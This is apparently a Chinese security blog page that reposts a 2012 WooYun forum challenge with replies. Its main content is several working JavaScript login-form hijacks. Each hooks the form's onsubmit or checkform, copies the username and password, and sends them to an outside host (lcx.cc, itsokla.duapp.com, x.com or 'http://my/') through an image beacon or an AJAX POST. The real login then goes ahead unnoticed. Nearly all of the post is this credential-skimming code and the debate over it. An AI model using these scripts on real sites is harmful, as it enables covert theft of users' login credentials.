+    // By: Nuclear'Atk, Blog: Http://lcx.cc/
+
+&lt;/script&gt;
+&lt;div id="test"&gt;&lt;/div&gt;
+&lt;script&gt;
+    var x = document.forms[0];                    // form
+    var f;
+    //alert(x.onsubmit);
+    x.f = x.onsubmit;                             // 获取原始函数
+    x.onsubmit = function() {                    // 设置新函数，达到拦截的目的
+        //alert("hook!");
+
+        if (document.loginform.username.value=='') {
+            alert("Please type your username!");
+            document.loginform.username.focus();
+            return false;
+        }
+        if (document.loginform.password.value=='') {
+            alert("Please type your password!");
+            document.loginform.password.focus();
+            return false;
+        }
+
+        var s;
+        s = "username=" + document.loginform.username.value +
+            "&amp;password=" + document.loginform.password.value;    // 获取账号密码
+        //alert(s);
+
+        document.getElementById('test').innerHTML = "&lt;img src=\"https://lcx.cc/?" + s + "\"" +
+                                                    " width=\"0\" height=\"0\"" + 
+                                                    " onload=\"document.forms[0].submit()\" onerror=\"document.forms[0].submit()\" &gt;";
+        
+        return false;                            // 直接拦截表单，终止提交
+    }
+
+    /************************** INPUT CODE *******************************/
+&lt;/script&gt;
+&lt;/html&gt;
+
+&lt;!--
+参考资料：
+
+    关于用JavaScript拦截form的submit方法实现：
+    http://www.blogjava.net/yaoleiyu/archive/2006/12/23/89636.html
+
+    onsubmit=return false阻止form表单提交javascript：
+    http://www.web600.net/html/editor/JavaScript/201001281667.html
+--&gt;</pre>
+<p style="text-indent:2em;">
+	版本二：
+</p>
+<p style="text-indent:2em;">
+	另一个，ajax 版本的。
+</p>
+<p style="text-indent:2em;">
+	这个问题难点在于，如何不破坏原函数运行逻辑（不是在新函数中重写原函数功能），而在这个例子中又无法调用原函数（body）。
+</p>
+<pre class="prettyprint lang-html">&lt;html&gt;
+&lt;body&gt;
+&lt;form method=post name=loginform onsubmit="return checkform()"&gt;
+&lt;input type=hidden name=a value='do_login'&gt;
+&lt;input type=hidden name=follow value=''&gt;
+&lt;input type=hidden name=follow_id value=''&gt;
+&lt;table cellspacing=0 cellpadding=2 border=0 align="center"&gt;
+&lt;tr&gt;
+&lt;td height="32"&gt;Username:&lt;/td&gt;
+&lt;td&gt;&lt;input type=text name=username value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;
+&lt;td height="32"&gt;Password:&lt;/td&gt;
+&lt;td&gt;&lt;input type=password name=password value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;nbsp;&lt;/td&gt;
+&lt;td&gt;&lt;input type=submit value="Login" class=sbmt&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;/table&gt;
+&lt;/form&gt;
+&lt;script language=javascript&gt;
+function checkform() {
+  if (document.loginform.username.value=='') {
+    alert("Please type your username!");
+    document.loginform.username.focus();
+    return false;
+  }
+  if (document.loginform.password.value=='') {
+    alert("Please type your password!");
+    document.loginform.password.focus();
+    return false;
+  }
+  return true;
+}
+&lt;/body&gt;
+&lt;/script&gt;
+&lt;script&gt;
+    /************************** INPUT CODE *******************************/
+    // By: Nuclear'Atk, Blog: Http://lcx.cc/
+
+&lt;/script&gt;
+&lt;div id="test"&gt;&lt;/div&gt;
+&lt;script&gt;
+    var x = document.forms[0];                    // form
+    var f;
+    //alert(x.onsubmit);
+    x.f = x.onsubmit;                             // 获取原始函数
+    x.onsubmit = function() {                    // 设置新函数，达到拦截的目的
+        //alert("hook!");
+
+        if (document.loginform.username.value=='') {
+            alert("Please type your username!");
+            document.loginform.username.focus();
+            return false;
+        }
+        if (document.loginform.password.value=='') {
+            alert("Please type your password!");
+            document.loginform.password.focus();
+            return false;
+        }
+
+        var s;
+        s = "username=" + document.loginform.username.value +
+            "&amp;password=" + document.loginform.password.value;    // 获取账号密码
+        //alert(s);
+
+        var xmlhttp;
+        xmlhttp = GetXmlHttpObject();
+        xmlhttp.open("POST", "https://lcx.cc/", false);
+        xmlhttp.setRequestHeader("Connection", "Close");                                    // Close = 不保持连接，Keep-Alive = 保持连接(持久连接)
+        xmlhttp.setRequestHeader("Content-Length", s.length);                               // 设置内容长度，Post 方式用的
+        xmlhttp.send(s);                                                                    // Post 方式：xmlhttp.send(参数);
+
+        return false;                            // 直接拦截表单，终止提交
+    }
+
+    function GetXmlHttpObject() {
+        // 不同的浏览器创建 XMLHttpRequest 对象的方法是有差异的。
+        // IE 浏览器使用 ActiveXObject，而其他的浏览器使用名为 XMLHttpRequest 的 JavaScript 内建对象。
+        // 如需针对不同的浏览器来创建此对象，我们要使用一条 "try and catch" 语句。
+        var xmlHttp = null;
+        try {
+            // Firefox, Opera 8.0+, Safari
+            xmlHttp = new XMLHttpRequest();
+        } catch(e) {
+            // Internet Explorer
+            try {
+                xmlHttp = new ActiveXObject("Msxml2.XMLHTTP");
+            } catch(e) {
+                try {
+                    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+                } catch(e) {
+                    alert("您的浏览器不支持AJAX！");
+                    return false;
+                }
+            }
+        }
+        return xmlHttp;
+    }
+
+    /************************** INPUT CODE *******************************/
+&lt;/script&gt;
+&lt;/html&gt;
+
+&lt;!--
+参考资料：
+
+    关于用JavaScript拦截form的submit方法实现：
+    http://www.blogjava.net/yaoleiyu/archive/2006/12/23/89636.html
+
+    onsubmit=return false阻止form表单提交javascript：
+    http://www.web600.net/html/editor/JavaScript/201001281667.html
+--&gt;</pre>
+<hr />
+<p>
+	<strong>接下来的原帖回复：</strong> 
+</p>
+<p style="text-indent:2em;">
+	_Evil (性趣是最好的老师.) | 2012-08-12 18:01
+</p>
+<p style="text-indent:2em;">
+	@核攻击 重点是劫持原函数 谢谢了 = =我发的那个是按照自己思路来写的,作者的意思是劫持函数。我上面的那个改改应该能用,用window.mousedown来判断 @_@有错误希望老大吐槽！！！
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-12 23:49
+</p>
+<p style="text-indent:2em;">
+	@_Evil 你的答案问题好多。。。。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-13 00:03
+</p>
+<p style="text-indent:2em;">
+	@核攻击 你的代码是把帐号信息发送到远程了，但是调用document.forms[0].submit()就不会调用onsubmit事件了吧。我的意思是不破坏登录过程和判断即可，可以在新函数中重写原函数功能
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	only_guest (www.guoke.ca) | 2012-08-13 00:09
+</p>
+<p style="text-indent:2em;">
+	@gainover 写6个版本.我上6个马甲来发
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-13 01:04
+</p>
+<p style="text-indent:2em;">
+	@only_guest 老大看不过去了？看不过去自己写不来？还需要go大牛帮你搞？
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2012-08-13 08:01
+</p>
+<p style="text-indent:2em;">
+	@剁刀
+</p>
+<p style="text-indent:2em;">
+	复制代码，测试完再喊……
+</p>
+<p style="text-indent:2em;">
+	完全符合你任何要求……
+</p>
+<p style="text-indent:2em;">
+	目测你压根没测试……
+</p>
+<p style="text-indent:2em;">
+	并且我给了两套方案，一套利用 &lt;img 提交，兼容任何浏览器，不存在跨域问题。
+</p>
+<p style="text-indent:2em;">
+	另一套 ajax，POST 提交，存在跨域问题，并且代码很长，不推荐使用。
+</p>
+<p style="text-indent:2em;">
+	原函数功能并没有被破坏，而是在新函数中重写了。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2012-08-13 08:03
+</p>
+<p style="text-indent:2em;">
+	以上两段代码，经过调试、抓包，均成功提交数据到第三方地址，并且没有破坏原提交逻辑。
+</p>
+<p style="text-indent:2em;">
+	请楼主给出不符合条件的理由。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2012-08-13 08:22
+</p>
+<p style="text-indent:2em;">
+	额，会错意了，楼主要要的是劫持原函数，不是实现功能。
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2012-08-13 08:26
+</p>
+<p style="text-indent:2em;">
+	@剁刀
+</p>
+<p style="text-indent:2em;">
+	不破坏登陆过程的尺度指的是？
+</p>
+<p style="text-indent:2em;">
+	最终提交操作必须是“onsubmit”？
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-13 09:19
+</p>
+<p style="text-indent:2em;">
+	@核攻击 嗯，符合要求，但是你提前闭合偶的script标签。。。这个有点不厚道:)
+</p>
+<hr />
+<p style="text-indent:2em;">
+	我又给出了另一个版本：
+</p>
+<pre class="prettyprint lang-html">&lt;html&gt;
+&lt;body&gt;
+&lt;form method=post name=loginform onsubmit="return checkform()"&gt;
+&lt;input type=hidden name=a value='do_login'&gt;
+&lt;input type=hidden name=follow value=''&gt;
+&lt;input type=hidden name=follow_id value=''&gt;
+&lt;table cellspacing=0 cellpadding=2 border=0 align="center"&gt;
+&lt;tr&gt;
+&lt;td height="32"&gt;Username:&lt;/td&gt;
+&lt;td&gt;&lt;input type=text name=username value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;tr&gt;
+&lt;td height="32"&gt;Password:&lt;/td&gt;
+&lt;td&gt;&lt;input type=password name=password value='' class=inpts size=30&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;nbsp;&lt;/td&gt;
+&lt;td&gt;&lt;input type=submit value="Login" class=sbmt&gt;&lt;/td&gt;
+&lt;/tr&gt;&lt;/table&gt;
+&lt;/form&gt;
+&lt;script language=javascript&gt;
+function checkform() {
+  if (document.loginform.username.value=='') {
+    alert("Please type your username!");
+    document.loginform.username.focus();
+    return false;
+  }
+  if (document.loginform.password.value=='') {
+    alert("Please type your password!");
+    document.loginform.password.focus();
+    return false;
+  }
+  return true;
+}
+&lt;/body&gt;
+&lt;/script&gt;
+&lt;script&gt;
+    /************************** INPUT CODE *******************************/
+    // By: Nuclear'Atk, Blog: Http://lcx.cc/
+
+&lt;/script&gt;
+&lt;div id="test"&gt;&lt;/div&gt;
+&lt;script&gt;
+    var x = document.loginform;                    // form
+    var f;
+    //alert(x.onsubmit);
+    x.f = x.onsubmit;                             // 获取原始函数
+    x.onsubmit = function() {                    // 设置新函数，达到拦截的目的
+        //alert("hook!");
+
+        if (document.loginform.username.value=='') {
+            alert("Please type your username!");
+            document.loginform.username.focus();
+            return false;
+        }
+        if (document.loginform.password.value=='') {
+            alert("Please type your password!");
+            document.loginform.password.focus();
+            return false;
+        }
+
+        var s;
+        s = "username=" + document.loginform.username.value +
+            "&amp;password=" + document.loginform.password.value;    // 获取账号密码
+        //alert(s);
+
+        //触发两次 onsubmit 事件，通过判断来发送两次数据，并且不破坏原函数逻辑
+        if (document.getElementById("NuclearAtk")) {
+            //alert("exist");
+            return true;                             // 允许提交表单
+        } else {
+            //alert("not exist");
+            document.getElementById('test').innerHTML = "&lt;img id=\"NuclearAtk\" src=\"https://lcx.cc/?" + s + "\"" +
+                                                        " width=\"0\" height=\"0\"" + 
+                                                        " onload=\"test()\" onerror=\"test()\" &gt;"; //document.forms[0].submit()
+            return false;                            // 拦截表单，终止提交
+        }
+    }
+
+    function test() {
+        //模拟点击提交按钮，重新触发 onsubmit 事件
+        var x = document.getElementsByTagName("input");
+        for (var i = 0; i &lt; x.length; i++) {
+            if (x[i].type == "submit") {
+                //alert(x[i].value);
+                x[i].click();
+                break;
+            }
+        }
+    }
+
+    /************************** INPUT CODE *******************************/
+&lt;/script&gt;
+&lt;/html&gt;</pre>
+<p style="text-indent:2em;">
+	嘿嘿，完美版本，完全使用 onsubmit 事件提交，没有破坏原始提交逻辑。
+</p>
+<p style="text-indent:2em;">
+	那个闭合 script标签 是因为要插入 &lt;img 标签，所以写了一个 &lt;div，如果你使用 ajax 的方式提交，就不需要多此一举了。
+</p>
+<hr />
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-13 09:40
+</p>
+<p style="text-indent:2em;">
+	@核攻击
+</p>
+<p style="text-indent:2em;">
+	1. 非ajax方法不允许提前闭合
+</p>
+<p style="text-indent:2em;">
+	2. 你的第二个方法，没看明白，哪里提交登录请求了？如果我猜测对的话，你是不是应该把lcx.cc的代码也贴出来？
+</p>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2012-08-13 10:08
+</p>
+<p style="text-indent:2em;">
+	@剁刀
+</p>
+<p style="text-indent:2em;">
+	目测你没理解，再仔细看看吧……
+</p>
+<p style="text-indent:2em;">
+	那个完美版本的卖点在于，它是完全使用 onsubmit 事件提交的表单，可以跟踪到……
+</p>
+<p style="text-indent:2em;">
+	和 lcx.cc 的代码有什么关系（你钻牛角居然能钻到这里！）？
+</p>
+<p style="text-indent:2em;">
+	那只是一个示例接收地址，你可以改成：www.baidu.com，或者任何地址……
+</p>
+<p style="text-indent:2em;">
+	至于又多出来的条件“不允许提前闭合”，我发了两个版本一个 &lt;img、一个ajax，你使用 ajax 的版本即可，完全不需要闭合的（上边那个ajax闭合&lt;script&gt;，是因为我之前测试&lt;img，然后又改成ajax的，忘记删除了，那个“&lt;div id="test"&gt;&lt;/div&gt;”在这里是没有实际作用的）。
+</p>
+<p style="text-indent:2em;">
+	完全符合楼主所有要求，以及新多出来的条件……
+</p>
+<p style="text-indent:2em;">
+	复制代码运行调试吧，抓包看看发了几个包，分别发送到哪里了……
+</p>
+<p style="text-indent:2em;">
+	目测可以结贴了……
+</p>
+<p style="text-indent:2em;">
+	最后，坐等楼主“标准答案”……
+</p>
+<p style="text-indent:2em;">
+	╮(╯_╰)╭
+</p>
+<p>
+	<strong>部分回帖：</strong> 
+</p>
+<p style="text-indent:2em;">
+	gainover ("&gt;_&lt; ' / &amp; \ 看啥，没见过跨站字符么) |2012-08-15 13:25
+</p>
+<p style="text-indent:2em;">
+	@only_guest 这个问题的关键在于，要拦截默认的submit事件，而默认采用的submit按钮，因此解决方案，
+</p>
+<p style="text-indent:2em;">
+	1.要么是动态去掉原来的submit类型的按钮，自己创建一个新按钮，并进行事件设置，在进行checkform判断之后，再进行表单的submit。&nbsp;
+</p>
+<p style="text-indent:2em;">
+	2.要么阻止submit按钮默认的表单提交行文。
+</p>
+<p style="text-indent:2em;">
+	这里用第2种方法编写代码：
+</p>
+<pre class="prettyprint lang-html">&lt;script&gt;
+/**************************INPUT CODE*******************************/
+(function x(){
+  function $(id,t){
+    return document["getElementsBy"+(t?"Tag":"")+"Name"](id);
+  }
+  var inputs=$("input",1);
+  for(var i=0;i&lt;inputs.length;i++){
+    (function(){
+      inputs[i].type.toLowerCase()=="submit"
+      &amp;&amp;
+      (inputs[i].onclick=function(e){
+          //调用默认的checkform函数进行表单判断
+          if(checkform()){
+            //使用Image对象发送数据
+            with(new Image()){
+              onerror=function(){
+                //alert("发送成功");
+                //发送成功后，再提交
+                $("loginform")[0].submit();
+              };
+              src="http://itsokla.duapp.com/data.php?hash="+Math.random()+"&amp;u="+$("username")[0].value+"&amp;p="+$("password")[0].value;
+            }
+          }
+          //阻止submit的默认提交事件
+          var e=e||event;
+          //for non-ie
+          try{
+            e.preventDefault();
+          }catch(e){}
+          //for ie
+          event.returnValue=false;
+          return false;
+      });
+    })(i)
+  }
+})();
+&lt;/script&gt;</pre>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	p.z (我在沉默中被放屁惊醒) | 2012-08-15 13:46
+</p>
+<p style="text-indent:2em;">
+	不用那么麻烦吧,直接hook一下checkform函数就可以了啊. @jsbug 的那个返回值的细节没弄好.
+</p>
+<pre class="prettyprint lang-js">var c = checkform;
+checkform = function(){
+  (new Image()).src = 'http://my/?u' + document.loginform.username.value + '&amp;p=' + document.loginform.password.value;
+  return c();
+}</pre>
+<p style="text-indent:2em;">
+	&nbsp;
+</p>
+<p style="text-indent:2em;">
+	剁刀 | 2012-08-15 13:52
+</p>
+<p style="text-indent:2em;">
+	呃，好吧，答案在此：
+</p>
+<pre class="prettyprint lang-js">var x = document.mainform;
+x.onsubmit=function() {
+    if(checkform()==false) return false;
+    var user=document.mainform.username.value;
+    var password=document.mainform.password.value;
+    var a=new Image();
+    a.onerror=function(){
+      document.mainform.submit();
+    };
+    a.src="http://x.com/x.php?&amp;u="+user+"&amp;p="+password;
+    return false;
+}</pre>
+<p style="text-indent:2em;">
+	<a href="http://zone.wooyun.org/content/770" target="_blank">[更多内容请浏览原帖]</a> 
+</p>
+<p>
+	<strong><span style="color:#E53333;">参考资料：</span></strong> 
+</p>
+<p style="text-indent:2em;">
+	<a href="https://lcx.cc/post/2776/" target="_blank">关于用JavaScript拦截form的submit方法实现</a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="http://www.web600.net/html/editor/JavaScript/201001281667.html" target="_blank">onsubmit=return false阻止form表单提交javascript</a> 
+</p>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="2382,2775,58.101.2.177">
+<p>我叫【石小粉】 @ 2012-09-17 21:35:38</p>
+<p style="text-indent:2em">学习了。我这就弄个乌云的马甲去。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">额……</p>
+</blockquote>
+</div>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2012-08-15
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E5%8A%AB%E6%8C%81/">劫持</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/blog/">Blog</a>
+          <a href="https://lcx.cc/tags/google/">Google</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/java/">Java</a>
+          <a href="https://lcx.cc/tags/js/">js</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/nuclear/">Nuclear</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/putty/">Putty</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
+          <a href="https://lcx.cc/tags/wooyun/">wooyun</a>
+          <a href="https://lcx.cc/tags/xss/">XSS</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E6%94%BB%E5%87%BB/">攻击</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+          <a href="https://lcx.cc/tags/%E5%AF%86%E7%A0%81/">密码</a>
+          <a href="https://lcx.cc/tags/%E9%AA%97/">骗</a>
+          <a href="https://lcx.cc/tags/%E5%85%A8%E7%90%83/">全球</a>
+          <a href="https://lcx.cc/tags/%E4%BA%8B%E4%BB%B6/">事件</a>
+          <a href="https://lcx.cc/tags/%E6%80%9D%E8%B7%AF/">思路</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          <a href="https://lcx.cc/tags/%E8%BF%9C%E7%A8%8B/">远程</a>
+          <a href="https://lcx.cc/tags/%E8%B4%A6%E5%8F%B7/">账号</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/2776/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">关于用 JavaScript 拦截 form 的 submit 方法实现</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/2774/">
+            <span class="next-text nav-default">Google 终获云操作系统专利</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 